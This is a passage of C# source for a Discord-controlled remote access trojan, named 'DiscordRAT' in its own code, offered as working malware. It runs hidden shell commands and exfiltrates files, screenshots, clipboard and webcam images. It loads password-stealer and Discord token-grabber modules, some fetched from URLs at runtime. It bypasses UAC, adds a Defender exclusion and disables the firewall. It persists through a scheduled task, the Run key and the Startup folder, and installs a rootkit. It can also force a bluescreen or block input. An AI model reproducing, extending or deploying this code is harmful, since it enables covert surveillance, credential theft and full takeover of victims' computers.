                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
                case "uncritproc":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        uncritproc();
                        await Send_message(channel_id, "Process uncritical!");
                    }
                    else
                    {
                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
                case "block":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        BlockInput(true);
                        await Send_message(channel_id, "Input blocked!");
                    }
                    else
                    {
                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
                case "unblock":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        BlockInput(false);
                        await Send_message(channel_id, "Input unblocked!");
                    }
                    else
                    {
                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
            }
        }

        public static async Task<bool> Send_message(string channelid, string message)
        {
            string url = string.Format("https://discord.com/api/v9/channels/{0}/messages", channelid);
            var payload = new Dictionary<object, object> { { "content", message } };
            var textpayload = DictionaryToJson(payload);
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            var content = new StringContent(textpayload, Encoding.UTF8, "application/json");
            try
            {
                var result = await httpClient.PostAsync(url, content);
                result.EnsureSuccessStatusCode();
                var response = await result.Content.ReadAsStringAsync();
                httpClient.Dispose();
                return true;
            }
            catch
            {
                httpClient.Dispose();
                return false;
            }
        }
        public static async Task<bool> Send_attachment(string channelid, string message, List<byte[]> attachments, string[] filenames)
        {
            HttpClient httpClient = new HttpClient();
            MultipartFormDataContent form = new MultipartFormDataContent();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            form.Add(new StringContent(message), "content");
            int count = 0;
            foreach (var details in filenames.Zip(attachments, Tuple.Create))
            {
                form.Add(new ByteArrayContent(details.Item2, 0, details.Item2.Length), String.Format("files[{0}]", count.ToString()), details.Item1);
                count++;
            }
            try
            {
                HttpResponseMessage response = await httpClient.PostAsync(string.Format("https://discord.com/api/v9/channels/{0}/messages", channelid), form);
                response.EnsureSuccessStatusCode();
                httpClient.Dispose();
                return true;
            }
            catch
            {
                httpClient.Dispose();
                return false;
            }
        }
        public static byte[] StringToBytes(string input)
        {
            return Encoding.UTF8.GetBytes(input);
        }
        public static async Task ShellCommand(string command, string channelid)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo = new System.Diagnostics.ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            process.Start();
            string data = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task Speak(string channelid, string message)
        {
            using (SpeechSynthesizer synth = new SpeechSynthesizer())
            {
                synth.SetOutputToDefaultAudioDevice();
                Prompt color = new Prompt(message);
                synth.Speak(color);
            }
            await Send_message(channelid, "Command executed!");
        }
        public static async Task dir(string channelid)
        {
            string data = String.Join("\n", Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task upload(string channelid, string filepath)
        {
            byte[] data;
            try { data = File.ReadAllBytes(filepath); } catch { await Send_message(channelid, "File not found!"); return; }
            if (data.Length > 7500000)
            {
                using (var multipartFormContent = new MultipartFormDataContent())
                {
                    await Send_message(channelid, "File larger than 8mb, please wait while we upload to a third party!");
                    HttpClient httpClient = new HttpClient();
                    var byteContent = new ByteArrayContent(data);
                    multipartFormContent.Add(byteContent, name: "file", fileName: Path.GetFileName(filepath));
                    var response = await httpClient.PostAsync("https://file.io/", multipartFormContent);
                    response.EnsureSuccessStatusCode();
                    httpClient.Dispose();
                    var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
                    if ((bool)dict["success"] == true)
                    {
                        string link = (string)dict["link"];
                        await Send_message(channelid, "File uploaded, heres the download link!\n" + link);
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(channelid, "Error with uploading file!");
                    }
                }
            }
            else
            {
                await Send_attachment(channelid, "", new List<byte[]>() { data }, new string[] { Path.GetFileName(filepath) });
                await Send_message(ChannelId, "Command executed!");
            }
        }
        public static async Task<byte[]> LinkToBytes(string link)
        {
            Stream stream = new MemoryStream();
            HttpClient httpClient = new HttpClient();
            var response = await httpClient.GetAsync(link);
            await response.Content.CopyToAsync(stream);
            stream.Position = 0;
            byte[] buffer = new byte[stream.Length];
            for (int totalBytesCopied = 0; totalBytesCopied < stream.Length;)
                totalBytesCopied += stream.Read(buffer, totalBytesCopied, Convert.ToInt32(stream.Length) - totalBytesCopied);
            return buffer;
        }
        public static async Task BytesToWallpaper(string channelid, byte[] picture)
        {
            string path = Path.GetTempFileName() + ".png";
            try
            {
                File.WriteAllBytes(path, picture);
            }
            catch
            {
                await Send_message(channelid, "Error writing file!");
                return;
            }
            try
            {
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                try { File.Delete(path); } catch { }
                await Send_message(channelid, "Command executed!");
            }
            catch
            {
                try { File.Delete(path); } catch { }
                await Send_message(channelid, "Error setting wallpaper!");
            }

        }
        [STAThread]
        public static async Task GetClipboard(string channelid)
        {
            string data = null;
            try
            {
                Exception threadEx = null;
                Thread staThread = new Thread(
                    delegate ()
                    {
                        try
                        {
                            data = Clipboard.GetText();
                        }

                        catch (Exception ex)
                        {
                            threadEx = ex;
                        }
                    });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
            }
            catch
            {
                await Send_message(channelid, "Error getting clipboard!");
                return;
            }
            if (data == null) { await Send_message(channelid, "Clipboard empty!"); return; }
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }
        public static long GetLastInputTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            if (!GetLastInputInfo(ref lastInPut))
            {
                throw new Exception(GetLastError().ToString());
            }
            return lastInPut.dwTime;
        }
        public static async Task GetScreenshot(string channelid)
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            Stream stream = new MemoryStream();
            bmpScreenshot.Save(stream, ImageFormat.Png);
            stream.Position = 0;
            byte[] buffer = new byte[stream.Length];
            for (int totalBytesCopied = 0; totalBytesCopied < stream.Length;)
                totalBytesCopied += stream.Read(buffer, totalBytesCopied, Convert.ToInt32(stream.Length) - totalBytesCopied);
            await Send_attachment(channelid, "", new List<byte[]>() { buffer }, new string[] { "screenshot.png" });
            await Send_message(ChannelId, "Command executed!");
        }
        public static async Task Delete(string id)
        {
            string url = "https://discord.com/api/v9/channels/" + id;
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            try { await httpClient.DeleteAsync(url); } catch { }
        }
        public static async Task Kill(string session)
        {
            if (session.ToLower() == "all")
            {
                foreach (string i in session_channel_holder.Keys)
                {
                    if (!(session_channel_holder[i] == ChannelId)) await Delete(session_channel_holder[i]);
                }
                await Delete(ChannelId);
            }
            else
            {
                if (session_channel_holder.ContainsKey(session.ToLower())) await Delete(session_channel_holder[session.ToLower()]);
            }
        }
        public static async Task uacbypass(string path, string channelid)
        {
            Environment.SetEnvironmentVariable("windir", '"' + path + '"' + " ;#", EnvironmentVariableTarget.User);
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "SCHTASKS.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
                }
            };
            try
            {
                p.Start();
                await Task.Delay(1500);
            }
            catch 
            {
                await Send_message(channelid, "Error with uacbypass!");
            }
            Environment.SetEnvironmentVariable("windir", Environment.GetEnvironmentVariable("systemdrive") + "\\Windows", EnvironmentVariableTarget.User);
        }
        public static void Bluescreen()
        {
            bool tmp1;
            uint tmp2;
            RtlAdjustPrivilege(19, true, false, out tmp1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);

        }
        public static async Task ProcKill(string channelid, string procname)
        {
            Process[] runingProcess = Process.GetProcesses();
            for (int i = 0; i < runingProcess.Length; i++)
            {
                if (runingProcess[i].ProcessName == procname)
                {
                    runingProcess[i].Kill();
                }

            }
            await Send_message(channelid, "Command executed!");
        }
        public static async Task DisableDefender(string channelid)
        {
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "powershell.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "-Command Add-MpPreference -ExclusionPath \"C:\\\""
                }
            };
            p.Start();
            await Send_message(channelid, "Command executed!");
        }
        public static async Task DisableFirewall(string channelid)
        {
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "NetSh.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "Advfirewall set allprofiles state off"
                }
            };
            p.Start();
            await Send_message(channelid, "Command executed!");
        }
        public static async Task PlayAudio(string channelid, byte[] audio)
        {
            using (MemoryStream ms = new MemoryStream(audio))
            {
                System.Media.SoundPlayer player = new System.Media.SoundPlayer(ms);
                player.Play();
            }
            await Send_message(channelid, "Command executed!");
        }
        public static void critproc()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        public static void uncritproc()
        {
            int isCritical = 0;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        public static void DisableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null) objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
        public static void EnableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null) objRegistryKey.DeleteValue("DisableTaskMgr");
            objRegistryKey.Close();
        }
        public static void addstartupnonadmin()
        {
            AddToStartup();
        }
        public static void addstartupadmin()
        {
            AddToStartup();
        }
        public static string AddToStartup()
        {
            try
            {
                string startupPath = GetStartupPath();
                if (string.IsNullOrWhiteSpace(startupPath) || !File.Exists(startupPath))
                {
                    return "Startup failed: payload path not found.";
                }

                string quotedPath = "\"" + startupPath + "\"";
                if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                {
                    string taskName = "DiscordRAT";
                    string args = string.Format("/Create /F /TN \"{0}\" /TR {1} /SC ONLOGON /RL HIGHEST", taskName, quotedPath);
                    var p = new Process
                    {
                        StartInfo =
                        {
                            UseShellExecute = false,
                            FileName = "SCHTASKS.exe",
                            RedirectStandardError = true,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            Arguments = args
                        }
                    };
                    p.Start();
                    string output = p.StandardOutput.ReadToEnd();
                    string error = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    if (p.ExitCode != 0)
                    {
                        return "Task Scheduler failed: " + (string.IsNullOrWhiteSpace(error) ? output : error).Trim();
                    }
                    return "Added to Task Scheduler as '" + taskName + "'. Open taskschd.msc to verify.";
                }

                RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                rk.SetValue("DiscordRAT", quotedPath);
                rk.Close();

                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string shortcutPath = Path.Combine(startupFolder, "DiscordRAT.cmd");
                File.WriteAllText(shortcutPath, "@echo off\r\nstart \"\" " + quotedPath + "\r\n");

                return "Added to Startup folder and HKCU Run as 'DiscordRAT'. Check Settings > Apps > Startup.";
            }
            catch (Exception ex)
            {
                return "Startup failed: " + ex.Message;
            }
        }
        public static async Task<string> geolocate()
        {
            HttpClient httpClient = new HttpClient();
            var response = await httpClient.GetAsync("https://geolocation-db.com/json");
            response.EnsureSuccessStatusCode();
            var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
            string link = String.Format("http://www.google.com/maps/place/{0},{1}", dict["latitude"].ToString(), dict["longitude"].ToString());
            return link;
        }
        public static async Task<string> getip()
        {
            HttpClient httpClient = new HttpClient();
            var response = await httpClient.GetAsync("https://geolocation-db.com/json");
            response.EnsureSuccessStatusCode();
            var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
            return dict["IPv4"].ToString();
        }
        public static async Task getprocs(string channelid) 
        {
            List<string> temp = new List<string>();
            foreach (Process i in Process.GetProcesses()) 
            {
                temp.Add(i.ProcessName);
            }
            string data= string.Join("\n", temp);
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task<byte[]> GetModuleBytes(string moduleKey, string fileName)
        {
            if (EmbeddedModules != null && EmbeddedModules.ContainsKey(moduleKey))
            {
                return EmbeddedModules[moduleKey];
            }

            string baseDir = GetPayloadDirectory();
            var candidateNames = new List<string>();

            switch (moduleKey)
            {
                case "token":
                    candidateNames.Add("TokenProv.db");
                    candidateNames.Add("token.bin");
                    break;
                case "webcam":
                    candidateNames.Add("DeviceCache.db");
                    candidateNames.Add("media.bin");
                    break;
            }

            candidateNames.Add(fileName);

            var candidates = new List<string>();
            foreach (string name in candidateNames)
            {
                candidates.Add(Path.Combine(baseDir, "Cache", name));
                candidates.Add(Path.Combine(baseDir, "modules", name));
                candidates.Add(Path.Combine(baseDir, name));
            }

            foreach (string path in candidates)
            {
                if (File.Exists(path))
                {
                    return ReadModuleFile(path);
                }
            }

            if (dll_url_holder.ContainsKey(moduleKey))
            {
                return await LinkToBytes(dll_url_holder[moduleKey]);
            }

            throw new FileNotFoundException("Module not found: " + fileName);
        }

        public static async Task LoadDll(string name, byte[] data) 
        {
            dll_holder[name] = Assembly.Load(data);
        }
        public static async Task<string> password() 
        {
            if (!dll_holder.ContainsKey("password")) await LoadDll("password", await GetModuleBytes("password", "PasswordStealer.dll"));
            dynamic instance = Activator.CreateInstance(dll_holder["password"].GetType("PasswordStealer.Stealer"));
            MethodInfo runMethod = instance.GetType().GetMethod("Run",BindingFlags.Instance | BindingFlags.Public);
            string passwords = (string)runMethod.Invoke(instance, new object[] { });
            return passwords ?? "";
        }
        public static async Task sendpassword(string channelid)
        {
            try
            {
                string data = await password();
                if (string.IsNullOrWhiteSpace(data))
                {
                    await Send_message(channelid, "No passwords found on this system.");
                    return;
                }
                if (data.Length >= 1990)
                {
                    await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "password.txt" });
                    await Send_message(channelid, "Command executed!");
                }
                else
                {
                    await Send_message(channelid, "```" + data + "```");
                    await Send_message(channelid, "Command executed!");
                }
            }
            catch (Exception ex)
            {
                await Send_message(channelid, "Error stealing passwords: " + ex.Message);
            }
        }
        public static void rootkitaddpid(int pid)
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\$77config\pid");
            rk.SetValue(Path.GetRandomFileName(), pid, RegistryValueKind.DWord);
            rk.Close();
        }
        public static void rootkitaddpath(string path)
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\$77config\paths");
            rk.SetValue(Path.GetRandomFileName(), path, RegistryValueKind.String);
            rk.Close();
        }

        public static async Task Rootkit(string channelid) 
        {
            if (!dll_holder.ContainsKey("rootkit")) await LoadDll("rootkit", await LinkToBytes(dll_url_holder["rootkit"]));
            Assembly a = dll_holder["rootkit"];
            MethodInfo m = a.EntryPoint;
            try
            {
                var parameters = m.GetParameters().Length == 0 ? null : new[] { new string[0] };
                m.Invoke(null, parameters);
                rootkitaddpath(GetPayloadPath());
                rootkitaddpid(Process.GetCurrentProcess().Id);
                await Send_message(channelid, "Command executed!");
            }
            catch
            {
                await Send_message(channelid, "Error executing rootkit!");
            }
        }
        public static async Task UnRootkit(string channelid)
        {
            if (!dll_holder.ContainsKey("unrootkit")) await LoadDll("unrootkit", await LinkToBytes(dll_url_holder["unrootkit"]));
            Assembly a = dll_holder["unrootkit"];
            MethodInfo m = a.EntryPoint;
            try
            {
                var parameters = m.GetParameters().Length == 0 ? null : new[] { new string[0] };
                m.Invoke(null, parameters);
                await Send_message(channelid, "Command executed!");
            }
            catch
            {
                await Send_message(channelid, "Error removing rootkit!");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task helpmenu(string channelid)
        {
            string content = GetMainMenuText();
            var buttons = GetMainMenuButtons();

            if (!string.IsNullOrEmpty(HelpMenuMessageId))
            {
                if (await Edit_message_with_buttons(channelid, HelpMenuMessageId, content, buttons))
                {
                    return;
                }
            }

            HelpMenuMessageId = await Send_message_with_buttons(channelid, content, buttons);
        }

        public static async Task<bool> Edit_message_with_buttons(string channelid, string messageid, string message, Dictionary<string, string> buttons)
        {
            string url = string.Format("https://discord.com/api/v9/channels/{0}/messages/{1}", channelid, messageid);
            var payload = new Dictionary<object, object>
            {
                {"content", message},
                {"components", BuildButtonComponents(buttons)}
            };

            var textpayload = DictionaryToJson(payload);
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            var content = new StringContent(textpayload, Encoding.UTF8, "application/json");

            try
            {
                var request = new HttpRequestMessage(new HttpMethod("PATCH"), url) { Content = content };
                var result = await httpClient.SendAsync(request);
                httpClient.Dispose();
                return result.IsSuccessStatusCode;
            }
            catch
            {
                httpClient.Dispose();
                return false;
            }
        }

        public static async Task<string> Send_message_with_buttons(string channelid, string message, Dictionary<string, string> buttons)
        {
            string url = string.Format("https://discord.com/api/v9/channels/{0}/messages", channelid);
            var payload = new Dictionary<object, object>
            {
                {"content", message},
                {"components", BuildButtonComponents(buttons)}
            };

            var textpayload = DictionaryToJson(payload);
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            var content = new StringContent(textpayload, Encoding.UTF8, "application/json");

            try
            {
                var result = await httpClient.PostAsync(url, content);
                if (!result.IsSuccessStatusCode)
                {
                    httpClient.Dispose();
                    return null;
                }
                var response = await result.Content.ReadAsStringAsync();
                httpClient.Dispose();
                var dict = JsonToDictionary(response);
                return dict["id"].ToString();
            }
            catch
            {
                httpClient.Dispose();
                return null;
            }
        }
        public static async Task webcampic(string channelid)
        {
            if (!dll_holder.ContainsKey("webcam")) await LoadDll("webcam", await GetModuleBytes("webcam", "Webcam.dll"));
            if (!activator_holder.ContainsKey("webcam"))
            {
                activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
                activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            }
            object active = activator_holder["webcam"];
            active.GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            var cameras = active.GetType().GetField("cameras").GetValue(active) as IDictionary<int,string>;
            if (cameras.Count < 1) 
            {
                await Send_message(channelid, "No cameras found!");
                await Send_message(channelid, "Command executed!");
                return;
            }
            try
            {
                var runMethod = active.GetType().GetMethod("GetImage");
                byte[] imag = (byte[])runMethod.Invoke(active, new object[] { });
                await Send_attachment(channelid, "", new List<byte[]>() { imag }, new string[] { "webcam.jpg" });
                await Send_message(channelid, "Command executed!");
            }
            catch 
            {
                await Send_message(channelid, "Error taking picture!");
                await Send_message(channelid, "Command executed!");
                return;
            }
        }
        public static async Task select_cam(string channelid, string number)
        {
            if (!dll_holder.ContainsKey("webcam")) await LoadDll("webcam", await GetModuleBytes("webcam", "Webcam.dll"));
            if (!activator_holder.ContainsKey("webcam"))
            {
                activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
                activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            }
            int selection;
            try { selection = int.Parse(number); } catch { await Send_message(channelid, "Error that is not a number!"); return; }
            object active = activator_holder["webcam"];
            var runMethod = active.GetType().GetMethod("select");
            if (!(bool)runMethod.Invoke(active, new object[] { selection }))
            {
                await Send_message(channelid, "Error that is a invalid selection!");
            }
            else { await Send_message(channelid, "Selected onto camera " + selection); }
            await Send_message(channelid, "Command executed!");
        }
        public static async Task get_cams(string channelid)
        {
            if (!dll_holder.ContainsKey("webcam")) await LoadDll("webcam", await GetModuleBytes("webcam", "Webcam.dll"));
            if (!activator_holder.ContainsKey("webcam"))
            {
                activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
                activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            }
            object active = activator_holder["webcam"];
            var cameras = active.GetType().GetField("cameras").GetValue(active) as IDictionary<int, string>;
            if (cameras.Count < 1)
            {
                await Send_message(channelid, "No cameras found!");
                await Send_message(channelid, "Command executed!");
                return;
            }
            var runMethod = active.GetType().GetMethod("GetWebcams");
            string data = (string)runMethod.Invoke(active, new object[] { });
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "webcams.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task get_tokens(string channelid) 
        {
            try
            {
                if (!dll_holder.ContainsKey("token")) await LoadDll("token", await GetModuleBytes("token", "Token grabber.dll"));
                if (!activator_holder.ContainsKey("token"))
                {
                    activator_holder["token"] = Activator.CreateInstance(dll_holder["token"].GetType("Token_grabber.grabber"));
                }
                var active = activator_holder["token"];
                List<string> data = (List<string>)active.GetType().GetMethod("grab").Invoke(active, new object[] { });
                if (data == null || data.Count == 0)
                {
                    await Send_message(channelid, "No Discord tokens found on this system.");
                    return;
                }
                string built = string.Join("\n\n", data);
                if (built.Length >= 1990)
                {
                    await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(built) }, new string[] { "tokens.txt" });
                    await Send_message(channelid, "Command executed!");
                }
                else
                {
                    await Send_message(channelid, "```" + built + "```");
                    await Send_message(channelid, "Command executed!");
                }
            }
            catch (Exception ex)
            {
                Exception inner = ex;
                while (inner.InnerException != null)
                {
                    inner = inner.InnerException;
                }
                await Send_message(channelid, "Error grabbing tokens: " + inner.Message);
            }
        }
        public static async Task CommandHandler(string message_content, string[] attachment_urls) 
        {
            //await Send_attachment(ChannelId, "", new List<byte[]>() { Encoding.ASCII.GetBytes("test"), Encoding.ASCII.GetBytes("test2") },new string[] {"poggers.txt","pog.txt"});
            //await Send_message(ChannelId, message_data);
            
            // Support both !command and command! formats
            string normalizedContent = message_content.Trim().ToLower();
            if (!normalizedContent.StartsWith("!") && !normalizedContent.EndsWith("!")) return;
            
            // Convert help! to !help, screenshot! to !screenshot, etc.
            if (normalizedContent.EndsWith("!") && !normalizedContent.StartsWith("!"))
            {
                normalizedContent = "!" + normalizedContent.Substring(0, normalizedContent.Length - 1);
            }
            
            string command = normalizedContent.Split(" ".ToCharArray())[0];
            string message_data = string.Join(" ", message_content.Split(" ".ToCharArray()).Skip(1));
            switch (command)
            {
                case "!grabtokens":
                    await get_tokens(ChannelId);
                    break;
                case "!getcams":
                    await get_cams(ChannelId);
                    break;
                case "!selectcam":
                    await select_cam(ChannelId, message_data);
                    break;
                case "!webcampic":
                    await webcampic(ChannelId);
                    break;
                case "!message":
                    MessageBox.Show(message_data);
                    break;
                case "!shell":
                    await Task.Factory.StartNew(() => ShellCommand(message_data, ChannelId));
                    break;
                case "!voice":
                    await Speak(ChannelId, message_data);
                    break;
                case "!admincheck":
                    await Send_message(ChannelId, new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!cd":
                    Directory.SetCurrentDirectory(message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!dir":
                    await dir(ChannelId);
                    break;
                case "!download":
                    await upload(ChannelId, message_data);
                    break;
                case "!upload":
                    if (attachment_urls.Length > 0)
                    {
                        try
                        {
                            File.WriteAllBytes(message_data, await LinkToBytes(attachment_urls[0]));
                            await Send_message(ChannelId, "Command executed!");
                        }
                        catch 
                        {
                            await Send_message(ChannelId, "Error writing file!");

                        }
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find attachment!");
                    }
                    break;
                case "!uploadlink":
                    if (message_data.Split(" ".ToCharArray()).Length > 1)
                    {
                        try
                        {
                            File.WriteAllBytes(message_data.Split(" ".ToCharArray())[0], await LinkToBytes(message_data.Split(" ".ToCharArray())[1]));
                            await Send_message(ChannelId, "Command executed!");
                        }
                        catch
                        {
                            await Send_message(ChannelId, "Error writing file!");

                        }
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find filename or link!");
                    }
                    break;
                case "!delete":
                    if (message_data != null && message_data != "")
                    {
                        try
                        {
                            File.Delete(message_data);
                            await Send_message(ChannelId, "Command executed!");
                        }
                        catch
                        {
                            await Send_message(ChannelId, "Error deleting file!");

                        }
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find filename!");
                    }
                    break;
                case "!write":
                    SendKeys.SendWait(message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!wallpaper":
                    
                    if (attachment_urls.Length > 0)
                    {
                        await BytesToWallpaper(ChannelId, await LinkToBytes(attachment_urls[0]));
                    }
                    else
                    {
                        await Send_message(ChannelId, "Could not find attachment!");
                    }
                    break;
                case "!clipboard":
                    await GetClipboard(ChannelId);
                    break;
                case "!idletime":
                    await Send_message(ChannelId, (GetIdleTime()/1000).ToString());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!currentdir":
                    await Send_message(ChannelId, Directory.GetCurrentDirectory());
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!block":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        BlockInput(true);
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!unblock":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        BlockInput(false);
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(ChannelId, "You dont have admin!");
                    }
                    break;
                case "!screenshot":
                    await GetScreenshot(ChannelId);
                    break;
                case "!exit":
                    Application.Exit();
                    Environment.Exit(0);
                    break;
                case "!kill":
                    await Kill(message_data);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!uacbypass":
                    await uacbypass(GetPayloadPath(),ChannelId);
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!shutdown":
                    Process.Start("shutdown", "/s /t 0");
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!restart":
                    Process.Start("shutdown", "/r /t 0");
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!logoff":
                    Process.Start("shutdown", "/L");
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!bluescreen":
                    Bluescreen();
                    await Send_message(ChannelId, "Command executed!");
                    break;
                case "!datetime":
                    await Send_message(ChannelId, DateTime.Now.ToString(@"MM\/dd\/yyyy h\:mm tt"));
